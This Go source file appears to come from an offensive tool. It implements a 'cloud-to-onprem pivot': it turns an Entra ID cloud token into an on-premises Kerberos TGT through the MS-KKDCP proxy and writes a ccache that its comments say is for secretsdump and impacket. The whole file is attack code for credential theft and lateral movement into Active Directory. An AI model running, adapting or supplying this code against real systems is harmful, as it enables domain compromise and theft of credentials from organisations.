package pivot

import (
	"context"
	"encoding/binary"
	"fmt"
)

// CloudKerberosResult reports the outcome of a cloud-to-onprem pivot.
type CloudKerberosResult struct {
	CcachePath string
	Realm      string
	TicketSize int
	Prefix     string // KKDCP reply prefix info (diagnostics)
}

// ExtractCloudTGT performs the cloud-to-onprem Kerberos extraction:
//
//  1. Builds an AS-REQ for krbtgt/<REALM> with the cloud token as
//     Azure AD Kerberos pre-authentication material.
//  2. Sends it through MS-KKDCP (HTTPS) to the Entra ID KDC proxy.
//  3. Parses the AS-REP and writes a MIT ccache for secretsdump /
//     impacket consumption.
func ExtractCloudTGT(ctx context.Context, kkdc *KKDCPClient, opts ASREQOptions, clientPrincipal, ccachePath string) (*CloudKerberosResult, error) {
	if kkdc == nil {
		return nil, fmt.Errorf("kkdcp client is required")
	}
	if opts.Realm == "" && kkdc.Domain != "" {
		opts.Realm = kkdc.Domain
	}

	asReq, err := BuildASREQ(opts)
	if err != nil {
		return nil, fmt.Errorf("build as-req: %w", err)
	}

	reply, err := kkdc.Send(ctx, asReq)
	if err != nil {
		return nil, err
	}

	prefix := "plain"
	if len(reply) > 4 {
		n := binary.BigEndian.Uint32(reply[:4])
		if int(n) == len(reply)-4 {
			prefix = "kdcproxy-wrapped"
		}
	}

	info, err := ParseASREP(reply)
	if err != nil {
		return nil, fmt.Errorf("parse as-rep: %w (reply: %s)", err, HexDump(reply))
	}

	if ccachePath == "" {
		ccachePath = "aether.ccache"
	}
	if err := WriteCcache(ccachePath, info, clientPrincipal); err != nil {
		return nil, fmt.Errorf("write ccache: %w", err)
	}

	return &CloudKerberosResult{
		CcachePath: ccachePath,
		Realm:      info.CRealm,
		TicketSize: len(info.TicketDER),
		Prefix:     prefix,
	}, nil
}

// WriteRawCcacheFromReply is a helper for tests and manual handling:
// treats reply as a raw AS-REP and writes the ccache directly.
func WriteRawCcacheFromReply(reply []byte, realm, client string, path string) error {
	info, err := ParseASREP(reply)
	if err != nil {
		return err
	}
	info.CRealm = realm
	return WriteCcache(path, info, client)
}
